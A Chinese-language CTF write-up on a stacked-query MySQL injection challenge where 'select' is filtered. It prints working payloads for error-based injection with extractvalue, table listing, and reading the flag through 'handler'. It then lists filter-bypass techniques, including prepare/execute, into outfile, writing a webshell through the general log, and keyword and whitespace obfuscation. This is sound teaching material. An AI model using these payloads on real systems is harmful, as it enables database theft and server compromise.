总结信息，show 没有被过滤，可以使用 show 来查库查表查字段，也可以用 extractvalue，updatexml 等报错结合 database() 来查询当前数据库。

本来是想试试用报错看看当前数据库名，然后无意间发现了一点其他知识：

inject=-1' and extractvalue(1,database())--+

没回显？难道必须要 concat(0x7e,(database()),0x7e)？
好奇去搜索了一下报错原理：

extractvalue()、updatexml() 函数用于从 XML 字符串中提取值，它的第二参数是一个 XPath 表达式。当 XPath 表达式不合法时，函数就会报错并返回错误信息，其中会包含导致错误的表达式片段。
当 XPath 表达式只为 database() 时，返回当前数据库名，例如 test，这个字符串由字母、数字和下划线组成，在 XPath 中可以被解释为一个合法的节点名。因此不会触发 XPath 语法错误，函数只会尝试在 XML 中查找该节点，而第一个参数 1 不是有效的 XML，最终返回 NULL 或者空，不会报错。这样没有错误信息，就不会返回报错。

那什么情况下 XPath 会语法错误？

  • 非法名称字符：~、!（除非 !=）、@（不在开头）、#、%、^、&、*（不在乘号位置）、`、? 等等。
  • 未转义的特殊符号：单独出现的 ' 或 " 不成对。
  • 括号不匹配。
  • 运算符连续错误。
  • 路径中以非法字符开头。

问题解决，并且已知数据库名为 supersqli（用 show databases; 堆叠也可以查出来）。

下一步解决查询内容问题，既然 select 已经被禁用了，那怎么办？
答：使用 handler。

handler 是 MySQL 专门用于从指定表中按索引顺序逐行读取数据的低级别存储引擎接口。虽然不具备 select 的完整功能，但是 handler 是为直接访问表存储引擎而设计的。handler 必须打开一个具体的表才能执行读取操作。

语法如下（中括号代表可选添加）：

handler tbl_name open [ [as] alias ]
handler tbl_name read index_name { = | <= | >= | < | > } (value1,value2,...)
    [ where where_condition ] [limit ...]
handler tbl_name read index_name { first | next | prev | last }
    [ where where_condition ] [limit ...]
handler tbl_name read { first | next }
    [ where where_condition ] [limit ...]
handler tbl_name close

handler 不支持无表查询。每次 read 操作只默认返回一条记录，如果要返回多条需要指定 limit 子句。不支持分区表。

有了方法，接下来查表名：

inject=-1';show tables from supersqli;--+

发现 FlagHere 表，使用 handler 和堆叠进行查询：

inject=-1';handler FlagHere open;handler FlagHere read first;--+

获得 flag。

除了 handler，想要绕过 select，可以从哪里入手呢？

  1. MySQL 8.0 新语法：table 语句和 values 语句
    table 语句是 select * from tbl_name 的语法糖，专门用于快速、简单地查询一个表中的所有数据。非常适合需要快速查看表内容。
    values 语句可以将提供的一组常量值直接构造成一个虚拟的数据表，非常灵活，在构造临时数据集或与其他查询进行联合时特别有用。
    需注意，在 MySQL 中，values 和 table 语句返回的都是“表数据”。

  2. 存储过程与预处理语句
    存储过程与动态 SQL：存储过程是数据库中的一段预编译程序。可以在其中避开 select 关键字，通过 prepare，execute 和 deallocate prepare 语句来执行动态 SQL。

     -- 创建一个存储过程，接收 sql 语句作为参数
 create procedure execute_sql(in sql_query text)
 begin
     set @query = sql_query;
     prepare stmt from @query;
     execute stmt;
     deallocate prepare stmt;
 end;

 -- 调用存储过程来执行被禁用的 select 查询
 call execute_sql('select * from users');

    由于 select 被包裹在存储过程中，外层 SQL 过滤器可能无法识别并阻止它。这种方法常用于在数据库权限受限或关键字被过滤的场景下，实现复杂的逻辑操作。

  3. 报错注入
    典型函数：extractvalue()；updatexml()；geometrycollection() 等。

  4. 文件读写
    如果数据库用户有 file 权限，且 secure_file_priv 允许，也可以：

    写文件：

     -- 利用 MySQL 的 into outfile 结合预处理语句
 set @sql = 'select * from users into outfile "..."';
 prepare stmt from @sql;
 execute stmt;

    或者利用日志写马：若开启了 general log，可以设置 log 文件为 web 目录下的 php 文件，然后执行触发 SQL 写 webshell。

另外补充一些基础绕过

  1. 语法变体

    • 大小写混淆：SelEct
    • 注释符插入：sel/**/ect
    • URL/Hex 编码：%53%45%4c%45%43%54
    • 内联注释：/*!50000 select*/

  2. 空格绕过

    • 使用特殊空白字符：TAB（%09）、换行（%0a）、回车（%0d）
    • 使用括号
    • 使用浮点数

  3. 引号绕过

    • 十六进制编码
    • PostgreSQL 美元符：select $$test$$

  4. 逗号绕过
    使用 join 或 offset 代替逗号：

     -- 代替 union select 1,2,3
 union select * from (select 1)a join (select 2)b join (select 3)c

 -- 代替 limit 1,2
 limit 1 offset 2

  5. 逻辑运算符绕过
    当 >、<、= 被过滤时，使用 greatest()、strcmp()、between...and 或 like 等函数或关键字替代。
